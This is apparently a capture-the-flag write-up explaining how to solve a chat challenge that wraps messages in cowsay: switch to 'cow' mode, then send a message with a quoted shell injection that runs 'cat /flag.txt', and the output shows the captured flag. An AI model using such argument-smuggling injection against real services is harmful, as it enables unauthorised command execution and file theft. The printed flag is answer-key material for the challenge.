This is similar to last year's challenge.

First, switch the interface to "cow" mode.

```
/watch cow
```

You would have to look at the source code file to know to switch it.

Then, do the command injection

```
/say hacked"; cat /flag.txt; " 
```


which turns into

```
/usr/games/cowsay "/say hacked"; cat /flag.txt; ""
```

```
 ________
< hacked >
 --------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
sigpwny{well_that_ruined_the_watch_party}
```